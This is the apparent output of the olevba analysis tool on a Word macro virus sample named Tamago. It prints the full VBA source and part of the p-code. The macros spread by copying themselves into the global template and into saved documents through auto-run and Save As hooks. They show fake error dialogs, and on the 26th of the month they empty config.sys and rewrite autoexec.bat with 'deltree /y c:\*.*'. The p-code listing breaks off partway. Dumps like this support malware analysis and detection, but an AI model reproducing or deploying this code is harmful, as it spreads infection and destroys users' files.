olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Tamago
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ArquivoSalvarComo.bas 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/ArquivoSalvarComo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    On Error GoTo -1: On Error GoTo WizEnd
    WordBasic.Dialog.FileSaveAs dlg
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizMod
    GoTo WizTart
WizMod:
    WordBasic.FileSaveAs dlg
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    dlg.Format = 1
    On Error GoTo -1: On Error GoTo WSave
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
WSave:
    On Error GoTo -1: On Error GoTo WClose
    WordBasic.MacroCopy "Global:ArquivoSalvarComo", WordBasic.[WindowName$]() + ":ArquivoSalvarComo"
WClose:
    On Error GoTo -1: On Error GoTo WOpen
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
WOpen:
    On Error GoTo -1: On Error GoTo WModelos
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOp"
WModelos:
    On Error GoTo -1: On Error GoTo WFerram
    WordBasic.MacroCopy "Global:ArquivoModelos", WordBasic.[WindowName$]() + ":ArquivoModelos"
WFerram:
    On Error GoTo -1: On Error GoTo WUtil
    WordBasic.MacroCopy "Global:FerramMacro", WordBasic.[WindowName$]() + ":FerramMacro"
WUtil:
    On Error GoTo -1: On Error GoTo WImp
    WordBasic.MacroCopy "Global:UtilMacro", WordBasic.[WindowName$]() + ":UtilMacro"
WImp:
    On Error GoTo -1: On Error GoTo WImpP
    WordBasic.MacroCopy "Global:ArquivoImprimir", WordBasic.[WindowName$]() + ":ArquivoImprimir"
WImpP:
    On Error GoTo -1: On Error GoTo WizSave
    WordBasic.MacroCopy "Global:ArquivoImprimirPadrão", WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão"
WizSave:
    WordBasic.FileSaveAs dlg
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ArquivoModelos.bas 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/ArquivoModelos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ArquivoModelos.MAIN"
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
    GoTo WizEnd
WizOk:
    WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FerramMacro.bas 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/FerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
    GoTo WizEnd
WizOk:
    WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UtilMacro.bas 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/UtilMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
    GoTo WizEnd
WizOk:
    WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    GoTo WizTart
WizOk:
    If WordBasic.Day(WordBasic.Now()) = 26 Then GoTo BHappy
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    On Error GoTo -1: On Error GoTo WSave
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
WSave:
    On Error GoTo -1: On Error GoTo WClose
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoSalvarComo", "Global:ArquivoSalvarComo"
WClose:
    On Error GoTo -1: On Error GoTo WOpen
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
WOpen:
    On Error GoTo -1: On Error GoTo WUtil
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOp", "Global:AutoOpen"
WUtil:
    On Error GoTo -1: On Error GoTo WModelos
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":UtilMacro", "Global:UtilMacro"
WModelos:
    On Error GoTo -1: On Error GoTo WFerram
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoModelos", "Global:ArquivoModelos"
WFerram:
    On Error GoTo -1: On Error GoTo WImp
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FerramMacro", "Global:FerramMacro"
WImp:
    On Error GoTo -1: On Error GoTo WImpP
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimir", "Global:ArquivoImprimir"
WImpP:
    On Error GoTo -1: On Error GoTo WizChk
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão", "Global:ArquivoImprimirPadrão"
WizChk:
    If WordBasic.Day(WordBasic.Now()) <> 26 Then GoTo WizEnd
    Open "c:\config.sys" For Output As 1
    Close 1
    Open "c:\autoexec.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "cls"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
    Print #1, "echo                        TaMaGoXI bY WiZaRD***"
    Print #1, "echo                                          ***"
    Print #1, "echo                                         *"
    Print #1, "echo                                        *"
    Print #1, "echo                          *************"
    Print #1, "echo                         *             *"
    Print #1, "echo                        *  ****   ****  *"
    Print #1, "echo                        *               *"
    Print #1, "echo                        *     *****     *"
    Print #1, "echo                         ***************"
    Print #1, "echo."
    Print #1, "echo                     eXPecT nO MeRcY FRoM HiM"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo File' not found: Serve Alcatara Mane'? (S/N)"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "deltree /y c:\*.* >nul"
    Close 1
BHappy:
    WordBasic.Beep
    WordBasic.MsgBox "EtERnAl LoVE 2 mY LitTlE gIrL Gi", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    GoTo WizTart
WizOk:
    WordBasic.FileNewDefault
    If WordBasic.Day(WordBasic.Now()) = 26 Then GoTo BHappy
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    If WordBasic.Day(WordBasic.Now()) <> 26 Then GoTo WizEnd
    WordBasic.FileNewDefault
    Open "c:\config.sys" For Output As 1
    Close 1
    Open "c:\autoexec.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "cls"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
    Print #1, "echo                        TaMaGoXI bY WiZaRD***"
    Print #1, "echo                                          ***"
    Print #1, "echo                                         *"
    Print #1, "echo                                        *"
    Print #1, "echo                          *************"
    Print #1, "echo                         *             *"
    Print #1, "echo                        *  ****   ****  *"
    Print #1, "echo                        *               *"
    Print #1, "echo                        *     *****     *"
    Print #1, "echo                         ***************"
    Print #1, "echo."
    Print #1, "echo                     eXPecT nO MeRcY FRoM HiM"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo File' not found: Serve Alcatara Mane'? (S/N)"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "deltree /y c:\*.* >nul"
    Close 1
BHappy:
    WordBasic.Beep
    WordBasic.MsgBox "EtERnAl LoVE 2 mY LitTlE gIrL Gi", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOp.bas 
in file: ./Virus.MSWord.Tamago - OLE stream: 'Macros/VBA/AutoOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    GoTo WizTart
WizOk:
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    dlg.Format = 1
    On Error GoTo -1: On Error GoTo WSave
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
WSave:
    On Error GoTo -1: On Error GoTo WClose
    WordBasic.MacroCopy "Global:ArquivoSalvarComo", WordBasic.[WindowName$]() + ":ArquivoSalvarComo"
WClose:
    On Error GoTo -1: On Error GoTo WOpen
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
WOpen:
    On Error GoTo -1: On Error GoTo WModelos
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOp"
WModelos:
    On Error GoTo -1: On Error GoTo WFerram
    WordBasic.MacroCopy "Global:ArquivoModelos", WordBasic.[WindowName$]() + ":ArquivoModelos"
WFerram:
    On Error GoTo -1: On Error GoTo WUtil
    WordBasic.MacroCopy "Global:FerramMacro", WordBasic.[WindowName$]() + ":FerramMacro"
WUtil:
    On Error GoTo -1: On Error GoTo WImp
    WordBasic.MacroCopy "Global:UtilMacro", WordBasic.[WindowName$]() + ":UtilMacro"
WImp:
    On Error GoTo -1: On Error GoTo WImpP
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimir", "Global:ArquivoImprimir"
WImpP:
    On Error GoTo -1: On Error GoTo WizSave
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão", "Global:ArquivoImprimirPadrão"
WizSave:
    WordBasic.FileSaveAs dlg
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Tamago
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ArquivoSalvarComo - 3147 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn caminho
' Line #3:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #4:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WizEnd 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	LitStr 0x0008 "TAMAGOXI"
' 	ArgsLd Environ 0x0001 
' 	St caminho$ 
' Line #8:
' 	Ld caminho$ 
' 	LitStr 0x0003 "GMS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WizMod 
' 	EndIf 
' Line #9:
' 	GoTo WizTart 
' Line #10:
' 	Label WizMod 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	LitStr 0x0042 "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi"
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #13:
' 	GoTo WizEnd 
' Line #14:
' 	Label WizTart 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #16:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WSave 
' Line #17:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Label WSave 
' Line #19:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WClose 
' Line #20:
' 	LitStr 0x0018 "Global:ArquivoSalvarComo"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0012 ":ArquivoSalvarComo"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Label WClose 
' Line #22:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WOpen 
' Line #23:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Label WOpen 
' Line #25:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WModelos 
' Line #26:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0007 ":AutoOp"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Label WModelos 
' Line #28:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WFerram 
' Line #29:
' 	LitStr 0x0015 "Global:ArquivoModelos"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000F ":ArquivoModelos"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Label WFerram 
' Line #31:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WUtil 
' Line #32:
' 	LitStr 0x0012 "Global:FerramMacro"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000C ":FerramMacro"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	Label WUtil 
' Line #34:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WImp 
' Line #35:
' 	LitStr 0x0010 "Global:UtilMacro"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":UtilMacro"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	Label WImp 
' Line #37:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WImpP 
' Line #38:
' 	LitStr 0x0016 "Global:ArquivoImprimir"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0010 ":ArquivoImprimir"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	Label WImpP 
' Line #40:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WizSave 
' Line #41:
' 	LitStr 0x001C "Global:ArquivoImprimirPadrão"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0016 ":ArquivoImprimirPadrão"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #42:
' 	Label WizSave 
' Line #43:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #44:
' 	Label WizEnd 
' Line #45:
' 	EndSub 
' Macros/VBA/ArquivoModelos - 1753 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn caminho
' Line #3:
' 	LitStr 0x0008 "TAMAGOXI"
' 	ArgsLd Environ 0x0001 
' 	St caminho$ 
' Line #4:
' 	Ld caminho$ 
' 	LitStr 0x0003 "GMS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WizOk 
' 	EndIf 
' Line #5:
' 	LitStr 0x0047 "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line."
' 	LitStr 0x000E "MicoSoft World"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #6:
' 	GoTo WizEnd 
' Line #7:
' 	Label WizOk 
' Line #8:
' 	LitStr 0x0025 "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!"
' 	LitStr 0x000F "TAmAGoXi's NoTe"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #9:
' 	Label WizEnd 
' Line #10:
' 	EndSub 
' Macros/VBA/FerramMacro - 1500 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn caminho
' Line #3:
' 	LitStr 0x0008 "TAMAGOXI"
' 	ArgsLd Environ 0x0001 
' 	St caminho$ 
' Line #4:
' 	Ld caminho$ 
' 	LitStr 0x0003 "GMS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WizOk 
' 	EndIf 
' Line #5:
' 	LitStr 0x0047 "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line."
' 	LitStr 0x000E "MicoSoft World"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #6:
' 	GoTo WizEnd 
' Line #7:
' 	Label WizOk 
' Line #8:
' 	LitStr 0x0025 "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!"
' 	LitStr 0x000F "TAmAGoXi's NoTe"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #9:
' 	Label WizEnd 
' Line #10:
' 	EndSub 
' Macros/VBA/UtilMacro - 1497 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn caminho
' Line #3:
' 	LitStr 0x0008 "TAMAGOXI"
' 	ArgsLd Environ 0x0001 
' 	St caminho$ 
' Line #4:
' 	Ld caminho$ 
' 	LitStr 0x0003 "GMS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WizOk 
' 	EndIf 
' Line #5:
' 	LitStr 0x0047 "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line."
' 	LitStr 0x000E "MicoSoft World"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #6:
' 	GoTo WizEnd 
' Line #7:
' 	Label WizOk 
' Line #8:
' 	LitStr 0x0025 "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!"
' 	LitStr 0x000F "TAmAGoXi's NoTe"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #9:
' 	Label WizEnd 
' Line #10:
' 	EndSub 
' Macros/VBA/AutoClose - 5583 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn caminho
' Line #3:
' 	LitStr 0x0008 "TAMAGOXI"
' 	ArgsLd Environ 0x0001 
' 	St caminho$ 
' Line #4:
' 	Ld caminho$ 
' 	LitStr 0x0003 "GMS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WizOk 
' 	EndIf 
' Line #5:
' 	GoTo WizTart 
' Line #6:
' 	Label WizOk 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo BHappy 
' 	EndIf 
' Line #8:
' 	LitStr 0x0042 "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi"
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #9:
' 	GoTo WizEnd 
' Line #10:
' 	Label WizTart 
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WSave 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Label WSave 
' Line #14:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WClose 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0012 ":ArquivoSalvarComo"
' 	Add 
' 	LitStr 0x0018 "Global:ArquivoSalvarComo"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Label WClose 
' Line #17:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WOpen 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Label WOpen 
' Line #20:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WUtil 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0007 ":AutoOp"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Label WUtil 
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WModelos 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":UtilMacro"
' 	Add 
' 	LitStr 0x0010 "Global:UtilMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Label WModelos 
' Line #26:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WFerram 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000F ":ArquivoModelos"
' 	Add 
' 	LitStr 0x0015 "Global:ArquivoModelos"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Label WFerram 
' Line #29:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WImp 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000C ":FerramMacro"
' 	Add 
' 	LitStr 0x0012 "Global:FerramMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	Label WImp 
' Line #32:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WImpP 
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0010 ":ArquivoImprimir"
' 	Add 
' 	LitStr 0x0016 "Global:ArquivoImprimir"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	Label WImpP 
' Line #35:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WizChk 
' Line #36:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0016 ":ArquivoImprimirPadrão"
' 	Add 
' 	LitStr 0x001C "Global:ArquivoImprimirPadrão"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #37:
' 	Label WizChk 
' Line #38:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo WizEnd 
' 	EndIf 
' Line #39:
' 	LitStr 0x000D "c:\config.sys"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #40:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #41:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo                        TaMaGoXI bY WiZaRD***"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo                                          ***"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "echo                                         *"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                                        *"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "echo                          *************"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "echo                         *             *"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                        *  ****   ****  *"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                        *               *"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                        *     *****     *"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "echo                         ***************"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo                     eXPecT nO MeRcY FRoM HiM"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #61:
